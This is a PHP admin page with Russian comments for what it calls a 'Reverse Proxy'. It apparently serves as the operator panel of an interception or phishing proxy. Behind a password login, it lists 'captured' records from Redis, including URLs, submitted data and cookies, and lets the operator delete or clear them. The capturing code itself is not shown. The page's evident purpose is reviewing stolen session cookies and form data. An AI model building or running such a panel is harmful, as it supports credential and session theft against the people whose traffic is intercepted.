<?php

// Загружаем автозагрузчик Composer
require_once __DIR__ . '/../vendor/autoload.php';

use Monolog\Logger;
use Monolog\Handler\StreamHandler;
use Predis\Client as RedisClient;

// Инициализируем логгер
$logger = new Logger('admin');
$logger->pushHandler(new StreamHandler(__DIR__ . '/../var/logs/admin.log', Logger::DEBUG));

// Загружаем конфигурацию
$config = require_once __DIR__ . '/../config/config.php';

// Инициализируем Redis-клиент
$redis = new RedisClient([
    'scheme' => 'tcp',
    'host'   => $config['redis']['host'],
    'port'   => $config['redis']['port'],
    'database' => $config['redis']['database']
]);

// Настройки безопасности
$adminPassword = $config['admin']['password'] ?? 'admin123'; // Лучше хранить в конфигурации
$adminTokenSecret = $config['admin']['token_secret'] ?? 'secret_key_for_admin_token';

// Функция для генерации безопасного токена
function generateAdminToken($secret) {
    $timestamp = time();
    $randomPart = bin2hex(random_bytes(16));
    $data = $timestamp . '|' . $randomPart;
    $signature = hash_hmac('sha256', $data, $secret);
    return base64_encode($data . '|' . $signature);
}

// Функция для проверки токена
function validateAdminToken($token, $secret) {
    try {
        $decoded = base64_decode($token);
        list($data, $signature) = explode('|', $decoded, 3);
        list($timestamp, $randomPart) = explode('|', $data, 2);
        
        // Проверяем срок действия токена (24 часа)
        if (time() - (int)$timestamp > 86400) {
            return false;
        }
        
        // Проверяем подпись
        $expectedSignature = hash_hmac('sha256', $data, $secret);
        return hash_equals($expectedSignature, $signature);
    } catch (Exception $e) {
        return false;
    }
}

// Проверяем аутентификацию
$authenticated = false;

// Обработка выхода
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    setcookie('admin_token', '', time() - 3600, '/');
    header('Location: admin.php');
    exit;
}

// Проверка входа
if (isset($_POST['password'])) {
    if (password_verify($_POST['password'], password_hash($adminPassword, PASSWORD_DEFAULT))) {
        $token = generateAdminToken($adminTokenSecret);
        setcookie('admin_token', $token, time() + 86400, '/', '', true, true);
        $authenticated = true;
        
        // Логируем успешный вход
        $logger->info('Успешный вход в панель администратора', [
            'ip' => $_SERVER['REMOTE_ADDR']
        ]);
        
        // Перенаправляем для избежания повторной отправки формы
        header('Location: admin.php');
        exit;
    } else {
        // Логируем неудачную попытку входа
        $logger->warning('Неудачная попытка входа в панель администратора', [
            'ip' => $_SERVER['REMOTE_ADDR']
        ]);
        
        $loginError = 'Неверный пароль';
    }
} elseif (isset($_COOKIE['admin_token'])) {
    $authenticated = validateAdminToken($_COOKIE['admin_token'], $adminTokenSecret);
    
    if (!$authenticated) {
        // Логируем недействительный токен
        $logger->warning('Недействительный токен аутентификации', [
            'ip' => $_SERVER['REMOTE_ADDR']
        ]);
        
        setcookie('admin_token', '', time() - 3600, '/');
    }
}

// Функция для получения перехваченных данных из Redis
function getCapturedData($redis) {
    $keys = $redis->keys('captured:*');
    $data = [];
    
    foreach ($keys as $key) {
        $item = $redis->hgetall($key);
        $item['key'] = $key;
        $data[] = $item;
    }
    
    // Сортируем по времени (новые сверху)
    usort($data, function($a, $b) {
        return $b['timestamp'] - $a['timestamp'];
    });
    
    return $data;
}

// Функция для удаления перехваченных данных
function deleteCapturedData($redis, $key) {
    $redis->del($key);
}

// Обработка действий
if ($authenticated) {
    // Удаление записи
    if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['key'])) {
        // Проверяем CSRF-токен
        if (isset($_GET['csrf_token']) && $_GET['csrf_token'] === hash_hmac('sha256', 'delete_' . $_GET['key'], $adminTokenSecret)) {
            deleteCapturedData($redis, $_GET['key']);
            
            // Логируем удаление
            $logger->info('Удалена запись', [
                'key' => $_GET['key'],
                'ip' => $_SERVER['REMOTE_ADDR']
            ]);
            
            header('Location: admin.php');
            exit;
        } else {
            // Логируем попытку CSRF-атаки
            $logger->warning('Попытка CSRF-атаки при удалении записи', [
                'ip' => $_SERVER['REMOTE_ADDR'],
                'key' => $_GET['key']
            ]);
            
            $csrfError = 'Ошибка безопасности: недействительный CSRF-токен';
        }
    }
    
    // Очистка всех данных
    if (isset($_GET['action']) && $_GET['action'] === 'clear_all') {
        // Проверяем CSRF-токен
        if (isset($_GET['csrf_token']) && $_GET['csrf_token'] === hash_hmac('sha256', 'clear_all', $adminTokenSecret)) {
            $keys = $redis->keys('captured:*');
            foreach ($keys as $key) {
                $redis->del($key);
            }
            
            // Логируем очистку
            $logger->info('Очищены все перехваченные данные', [
                'count' => count($keys),
                'ip' => $_SERVER['REMOTE_ADDR']
            ]);
            
            header('Location: admin.php');
            exit;
        } else {
            // Логируем попытку CSRF-атаки
            $logger->warning('Попытка CSRF-атаки при очистке всех данных', [
                'ip' => $_SERVER['REMOTE_ADDR']
            ]);
            
            $csrfError = 'Ошибка безопасности: недействительный CSRF-токен';
        }
    }
    
    // Получаем данные для отображения
    $capturedData = getCapturedData($redis);
    
    // Генерируем CSRF-токены
    $clearAllCsrfToken = hash_hmac('sha256', 'clear_all', $adminTokenSecret);
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Reverse Proxy - Панель администратора</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="container">
        <h1>Панель администратора Reverse Proxy</h1>
        
        <?php if (!$authenticated): ?>
            <!-- Форма аутентификации -->
            <div class="card">
                <div class="card-header">
                    <h2>Вход в панель администратора</h2>
                </div>
                <div class="card-body">
                    <?php if (isset($loginError)): ?>
                        <div class="alert alert-danger"><?php echo htmlspecialchars($loginError); ?></div>
                    <?php endif; ?>
                    
                    <form method="post" action="admin.php">
                        <div class="form-group">
                            <label for="password">Пароль:</label>
                            <input type="password" id="password" name="password" required>
                        </div>
                        <button type="submit" class="btn">Войти</button>
                    </form>
                </div>
            </div>
        <?php else: ?>
            <!-- Навигация -->
            <div class="nav">
                <ul class="nav-list">
                    <li class="nav-item"><a href="/" class="nav-link">Главная</a></li>
                    <li class="nav-item"><a href="admin.php" class="nav-link active">Перехваченные данные</a></li>
                    <li class="nav-item"><a href="admin.php?action=logout" class="nav-link">Выход</a></li>
                </ul>
            </div>
            
            <!-- Сообщения об ошибках -->
            <?php if (isset($csrfError)): ?>
                <div class="alert alert-danger"><?php echo htmlspecialchars($csrfError); ?></div>
            <?php endif; ?>
            
            <!-- Действия -->
            <div class="card mb-20">
                <div class="card-body">
                    <a href="admin.php?action=clear_all&csrf_token=<?php echo $clearAllCsrfToken; ?>" class="btn btn-danger" onclick="return confirm('Вы уверены, что хотите удалить все перехваченные данные?')">Очистить все данные</a>
                </div>
            </div>
            
            <!-- Таблица с перехваченными данными -->
            <div class="card">
                <div class="card-header">
                    <h2>Перехваченные данные</h2>
                </div>
                <div class="card-body">
                    <?php if (empty($capturedData)): ?>
                        <div class="alert alert-info">Перехваченные данные отсутствуют</div>
                    <?php else: ?>
                        <table>
                            <thead>
                                <tr>
                                    <th>Тип</th>
                                    <th>URL</th>
                                    <th>Данные</th>
                                    <th>Время</th>
                                    <th>Действия</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($capturedData as $item): ?>
                                    <tr>
                                        <td><?php echo htmlspecialchars($item['type'] ?? 'Неизвестно'); ?></td>
                                        <td><?php echo htmlspecialchars($item['url'] ?? ''); ?></td>
                                        <td>
                                            <?php 
                                                if (isset($item['data'])) {
                                                    $data = json_decode($item['data'], true);
                                                    if (is_array($data)) {
                                                        echo '<pre>' . htmlspecialchars(json_encode($data, JSON_PRETTY_PRINT)) . '</pre>';
                                                    } else {
                                                        echo htmlspecialchars($item['data']);
                                                    }
                                                } elseif (isset($item['cookie'])) {
                                                    echo htmlspecialchars($item['cookie']);
                                                } else {
                                                    echo 'Нет данных';
                                                }
                                            ?>
                                        </td>
                                        <td><?php echo date('Y-m-d H:i:s', $item['timestamp']); ?></td>
                                        <td>
                                            <?php $deleteCsrfToken = hash_hmac('sha256', 'delete_' . $item['key'], $adminTokenSecret); ?>
                                            <a href="admin.php?action=delete&key=<?php echo urlencode($item['key']); ?>&csrf_token=<?php echo $deleteCsrfToken; ?>" class="btn btn-danger" onclick="return confirm('Вы уверены?')">Удалить</a>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    <?php endif; ?>
                </div>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>
